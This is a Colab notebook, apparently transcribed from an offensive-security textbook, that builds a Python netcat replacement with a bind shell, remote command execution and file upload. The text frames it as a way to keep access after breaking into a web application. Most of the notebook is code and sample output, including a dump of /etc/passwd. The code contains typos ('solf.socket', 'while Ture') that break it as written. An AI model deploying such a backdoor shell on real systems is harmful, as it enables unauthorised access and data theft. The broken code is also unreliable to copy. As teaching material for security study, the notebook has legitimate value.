{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMMVCjtFwqU1jMzXPZw/tUf",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C1-Basic_Networking_Tools/Netcat.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__Replacing Netcat__*\n",
        "\n",
        "Netcat is the utility knife of networking, so it's no surprise that shrewd systems administrators remove it from their systems. Such a useful tool would be quite an asset if an attacker managed to find a way in. With it, you can read and write data across the network, meaning you can use it to execute remote commands, pass files back and forth, or even open a remote shell. On more than one occasion, we're run into servers that don't have netcat installed but do have Python. In these cases, it's useful to create a simple network client and server that you can use to push files, or a listener that gives you command line access. If you've broken in through a web application, it's definitely worth dropping a Python callback to give you secondary access without having to first burn one of your trojans or backdoors. Creating a tool like this is also a great Python exercise, so let's get started."
      ],
      "metadata": {
        "id": "_ER9Dbj4RVqQ"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "4v2ScjCIROaS"
      },
      "outputs": [],
      "source": [
        "import argparse\n",
        "import socket\n",
        "import shlex\n",
        "import subprocess\n",
        "import sys\n",
        "import textwrap\n",
        "import threading\n",
        "\n",
        "def execute(cmd):\n",
        "    cmd = cmd.strip()\n",
        "    if not cmd:\n",
        "        return\n",
        "    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT) #[1]\n",
        "\n",
        "    return output.decode()"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Here, we import all of our necessary libraries and set up the __execute()__ function, which receives a command, runs it, and returns the output as a string. This function contains a new library we haven't covered yet: The __subprocess__ library. This library provides a powerful process creation interface that gives you a number of ways to interact with client programs. In this case __[1]__, we're using its __check_output()__ method, which runs a command on the local operating system and then returns the output from that command."
      ],
      "metadata": {
        "id": "YIdzOO2STOLe"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now let's create our main block responsible for handling command line arguments and calling the rest of our functions:"
      ],
      "metadata": {
        "id": "GbvE9N2QT6nJ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "if __name__ == '__main__':\n",
        "    parser = argparse.ArgumentParser( #[1]\n",
        "        description='BHP Net Tool',\n",
        "        formatter_class=argparse.RawDescriptionHelpFormatter,\n",
        "        epilog=textwrap.dedent('''Example:\n",
        "            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell\n",
        "            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file\n",
        "            netcat.py -t 192.168.1.108 -p 5555 -l -e=\\\"cat /etc/passwd\\\" # execute command\n",
        "            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135\n",
        "            netcat.py -t 192.168.1.108 -p 5555 # connect to server\n",
        "        ''')) #[2]\n",
        "    parser.add_argument('-c', '--command', action='store_true', help='command shell') #[3]\n",
        "    parser.add_argument('-e', '--execute', help='execute specified command')\n",
        "    parser.add_argument('-l', '--listen', action='store_true', help='listen')\n",
        "    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')\n",
        "    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')\n",
        "    parser.add_argument('-u', '--upload', help='upload file')\n",
        "    args = parser.parse_args()\n",
        "    if args.listen:\n",
        "        buffer = ''\n",
        "    else:\n",
        "        buffer = sys.stdin.read()\n",
        "\n",
        "    nc = NetCat(args, buffer.encode())\n",
        "    nc.run()"
      ],
      "metadata": {
        "id": "cgwj3MMlUB7N"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We use the __argparse__ module from the standard library to create a command line interface __[1]__. We'll provide arguments so it can be invoked to upload a file, execute a command, or start a command shell.\n",
        "We provide example usage that the program will display when the user invokes it with __--help__ __[2]__ and add six arguments that specify how we want the program to behave __[3]__. The __-c__ argument sets up an interative shell, the __-e__ argument executes one specific command, the __-l__ argument indicates that a listener should be set up, the __-p__ argument specifies the port on which to communicate, the __-t__ argument specifies the target __IP__, and the __-u__ argument specifies the name of a file to upload. Both the sender and receiver can use this program, so the arguments define whether it's invoked to send or listen. The __-c__, __-e__, and __-u__ arguments imply the __-l__ argument, because those arguments apply to only the listener side of the communication. The sender side makes the connection to the listener, and so it needs only the __-t__ and __-p__ arguments to define the target listener.\n",
        "If we're setting it up as a listener __[4]__, we invoke the __NetCat__ object with an empty buffer string. Otherwise, we send the buffer contenct from __stdin__. Finally, we call the __run()__ method to start it up."
      ],
      "metadata": {
        "id": "XNf9P6uDWgR5"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now let's start putting in the plumbing for some of these features, beginning with our client code. Add the following code above the main block:"
      ],
      "metadata": {
        "id": "aOE404ujYooo"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class NetCat:\n",
        "    def __init__(self, args, buffer=None): #[1]\n",
        "        self.args = args\n",
        "        self.buffer = buffer\n",
        "        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #[2]\n",
        "        solf.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n",
        "\n",
        "    def run(self):\n",
        "        if self.args.listen:\n",
        "            self.listen() #[3]\n",
        "        else:\n",
        "            self.send() #[4]"
      ],
      "metadata": {
        "id": "HYHU4MbrYzqD"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We initialise the __NetCat__ object with the arguments from the command line and the buffer __[1]__ and then create the socket object __[2]__.\n",
        "The __run()__ method, which is the entry point for managing the __NetCat__ object, is pretty simple: It delegates execution to two methods. If we're setting up a listener, we call the __listen()__ method __[3]__. Otherwise, we call the __send()__ method __[4]__."
      ],
      "metadata": {
        "id": "r8Hhf59wbm8v"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now let's write that __send()__ method:"
      ],
      "metadata": {
        "id": "ZEVfjHPOcHwc"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class NetCat(NetCat):\n",
        "    def send(self):\n",
        "        self.socket.connect((self.args.target, self.args.port)) #[1]\n",
        "        if self.buffer:\n",
        "            self.socket.send(self.buffer)\n",
        "\n",
        "        try: #[2]\n",
        "            while True: #[3]\n",
        "                recv_len = 1\n",
        "                response = ''\n",
        "                while recv_len:\n",
        "                    data = self.socket.recv(4096)\n",
        "                    recv_len = len(data)\n",
        "                    response += data.decode()\n",
        "                    if recv_len < 4096:\n",
        "                        break #[4]\n",
        "                if response:\n",
        "                    print(response)\n",
        "                    buffer = input('> ')\n",
        "                    buffer += '\\n'\n",
        "                    self.socket.send(buffer.encode()) #[5]\n",
        "        except KeyboardInterrupt: #[6]\n",
        "            print('User terminated.')\n",
        "            self.socket.close()\n",
        "            sys.exit()"
      ],
      "metadata": {
        "id": "qrmhSwt9cLlQ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We connect to the target and port __[1]__, and if we have a buffer, we send that to the target first. Then we set up a __try/catch__ block so we can manually close the connection with __CTRL-C__ __[2]__. Next, we start a loop __[3]__ to receive data from the target. If there is no more data, we break out of the loop __[4]__. Otherwise, we print the response data and pause to get interactive input, send that input __[5]__, and continue the loop.\n",
        "The loop will continue until the __KeyboardInterrupt__ occurs (__CTRL-C__) __[6]__, which will close the socket."
      ],
      "metadata": {
        "id": "VXL2UbYZdNaT"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now let's write the method that executes when the program runs as a listener:"
      ],
      "metadata": {
        "id": "2YDP69Mzd52e"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class NetCat(NetCat):\n",
        "    def listen(self):\n",
        "        self.socket.bind((self.args.target, self.args.port)) #[1]\n",
        "        self.socket.listen(5)\n",
        "        while True: #[2]\n",
        "            client_socket, _ = self.socket.accept()\n",
        "            client_thread = threading.Thread( #[3]\n",
        "                target=self.handle, args=(client_socket,)\n",
        "            )\n",
        "            client_thread.start()"
      ],
      "metadata": {
        "id": "ISB0inwLeBMa"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __listen()__ method binds to the target and port __[1]__ and starts listening in a loop __[2]__, passing the connected socket to the __handle()__ method __[3]__."
      ],
      "metadata": {
        "id": "pRLreguce7C2"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now let's implement the logic to perform file uploads, execute commands, and create an interactive shell. The program can perform these tasks when operating as a listener."
      ],
      "metadata": {
        "id": "n1WE9kvQfImK"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class NetCat(NetCat):\n",
        "    def handle(self, client_socket):\n",
        "        if self.args.execute: #[1]\n",
        "            output = execute(self.args.execute)\n",
        "            client_socket.send(output.encode())\n",
        "\n",
        "        elif self.args.upload: #[2]\n",
        "            file_buffer = b''\n",
        "            while Ture:\n",
        "                data = client_socket.recv(4096)\n",
        "                if data:\n",
        "                    file_buffer += data\n",
        "                else:\n",
        "                    break\n",
        "            \n",
        "            with open(self.args.upload, 'wb') as f:\n",
        "                f.write(file_buffer)\n",
        "                message = f'Saved file {self.args.upload}'\n",
        "                client_socket.send(message.encode())\n",
        "        \n",
        "        elif self.args.command: #[3]\n",
        "            cmd_buffer = b''\n",
        "            while True:\n",
        "                try:\n",
        "                    client_socket.send(b'BHP: #> ')\n",
        "                    while '\\n' not in cmd_buffer.decode():\n",
        "                        cmd_buffer += client_socket.recv(64)\n",
        "                    response = execute(cmd_buffer.decode())\n",
        "                    if response:\n",
        "                        client_socket.send(response.encode())\n",
        "                    cmd_buffer = b''\n",
        "                except Exception as e:\n",
        "                    print(f'Server killed {e}')\n",
        "                    self.socket.close()\n",
        "                    sys.exit()"
      ],
      "metadata": {
        "id": "YxEUTIKTfUV5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __handle()__ method executes the task corresponding to the command line argument it receives: Execute a command, upload a file, or start a shell. If a command should be executed __[1]__, the __handle()__ method passes that command to the __execute()__ function and sends the output back on the socket. If a file should be uploaded __[2]__, we set up a loop to listen for content on the listening socket and receive data until there's no more data coming in. Then we write that accumulated content to the specified file. Finally, if a shell is to be created __[3]__, we set up a loop, send a prompt to the sender, and wait for command string to come back. We then execute the command by using the __execute()__ function and return the output of the command to the sender. You'll notice that the shell scans for a newline character to determine when to process a command, which makes it netcat friendly. That is, you can use this program on the listener side and use necat iself on the sender side. However, if you're conjuring up a Python client to speak to it, remember to add the newline character. In the __send()__ method, you can see we add the newline character after we get input from the console."
      ],
      "metadata": {
        "id": "4od6PA_Sg6BR"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__Kicking the tires__*\n",
        "\n",
        "Now let's play around with it a bit to see some output. In one terminal or __cmd.exe__ shell, run the script with the __--help__ argument:\n",
        "```\n",
        "$ python netcat.py --help\n",
        "usage: netcat.py [-h] [-c] [-e EXECUTE] [-l] [-p PORT] [-t TARGET] [-u UPLOAD]\n",
        "\n",
        "BHP Net Tool\n",
        "\n",
        "optional arguments:\n",
        "    -h, --help                        show this help message and exit\n",
        "    -c, --command                     initialize command shell\n",
        "    -e, EXECUTE, --execute EXECUTE    execute specified command\n",
        "    -l, --listen                      listen\n",
        "    -p PORT, --port PORT              specified port\n",
        "    -t TARGET, --target TARGET        specified IP\n",
        "    -u UPLOAD, --upload UPLOAD        upload file\n",
        "\n",
        "Example:\n",
        "    netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell\n",
        "    netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file\n",
        "    netcat.py -t 192.168.1.108 -p 5555 -l -e=\\\"cat /etc/passwd\\\" # execute command\n",
        "    echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135\n",
        "    netcat.py -t 192.168.1.108 -p 5555 # connect to server\n",
        "```"
      ],
      "metadata": {
        "id": "EppNaqzvXSCb"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now, on your Kali machine, set up a listener using its own __IP__ and port __5555__ to provide a command shell:\n",
        "```\n",
        "$ python netcat.py -t 192.168.1.203 -p 5555 -l -c\n",
        "```"
      ],
      "metadata": {
        "id": "UwuE-LHaZMZt"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now fire up another terminal on your local machine and run the script in client mode. Remember that the script reads from __stdin__ and will do so until it receives the end-of-file (__EOF__) marker. To send __EOD__, press __CTRL-D__ on your keyboard:\n",
        "```\n",
        "% python netcat.py -t 192.168.1.203 -p 5555\n",
        "CTRL-D\n",
        "<BHP:#> ls -la\n",
        "total 23497\n",
        "drwxr-xr-x 1 502 dialout        608 May 16 17:12 .\n",
        "drwxr-xr-x 1 502 dialout        512 Mar 29 11:23 ..\n",
        "-rw-r--r-- 1 502 dialout       8795 May  6 10:10 mytest.png\n",
        "-rw-r--r-- 1 502 dialout      14610 May 11 09:06 mytest.sh\n",
        "-rw-r--r-- 1 502 dialout       8795 May  6 10:10 mytest.txt\n",
        "-rw-r--r-- 1 502 dialout       4408 May 11 08:55 netcat.py\n",
        "<BHP: #> uname -a\n",
        "Linux kali 5.3.0-kali3-amd64 #1 SMP Debian 5.3.15-1kali1 (2019-12-09 x86_64 GNO/Linux)\n",
        "```"
      ],
      "metadata": {
        "id": "6XmE6S1WZez3"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "You can see that we receive our custom command shell. Because we're on a Unix host, we can run local commands and receive output in return, as if we had logged in via __SSH__ or were on the box locally. We can perform the same setup on the Kali machine but have it execute a single command using the __-e__ switch:\n",
        "```\n",
        "$ python netcat.py -t 192.168.1.203 -p 5555 -l -e=\"cat /etc/passwd\"\n",
        "```"
      ],
      "metadata": {
        "id": "gmMBFhtdb-yw"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now, when we connect to Kali from the local machine, we're rewarded with the output from the command:\n",
        "```\n",
        "% python necat.py -t 192.168.1.203 -p 5555\n",
        "\n",
        "root:x:0:0:root:/root:/bin/bash\n",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
        "sync:x:4:65534:sync:/bin:/bin/sync\n",
        "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
        "```"
      ],
      "metadata": {
        "id": "bhmQmivCcbbi"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "We could also use netcat on the local machine:\n",
        "```\n",
        "% nc 192.168.1.203 5555\n",
        "root:x:0:0:root:/root:/bin/bash\n",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
        "sync:x:4:65534:sync:/bin:/bin/sync\n",
        "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
        "```"
      ],
      "metadata": {
        "id": "Oq0Vk85EdO2Z"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Finally, we could use the client to send out requests the good, old-fashioned way:\n",
        "```\n",
        "$ echo -ne \"GET / HTTP/1.1\\r\\nHost: reachtim.com\\r\\n\\r\\n\" | python ./netcat.py -t reachtim.com -p 80\n",
        "\n",
        "HTTP/1.1 301 Moved Permanently\n",
        "\n",
        "Server: nginx\n",
        "Date: Mon, 18 May 2020 12:46:30 GMT\n",
        "Content-Type: text/html; charset=iso-8859-1\n",
        "Content_Length: 229\n",
        "Connection: keep-alive\n",
        "Location: https://reachtim.com/\n",
        "\n",
        "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n",
        "\\<html><head>\n",
        "<title>301 Moved Permanently</title>\n",
        "<</head><body>\n",
        "<h1>Moved Permanently</h1>\n",
        "<p>The document has moved <a href=\"https://reachtim.com/\">here</a>.</p>\n",
        "</body></html\\>\n",
        "```"
      ],
      "metadata": {
        "id": "emhM3eOudib2"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "There you go! While not a __super technical technique__, it's a good foundation for hacking together some client and server sockets in Python and using them for evil. Of course, this program covers only the fundamentals; use your imagination to expand or improve it. Next, let's build a __TCP__ proxy, which is useful in any number of offensive scenarios."
      ],
      "metadata": {
        "id": "foDRD3nReyC7"
      }
    }
  ]
}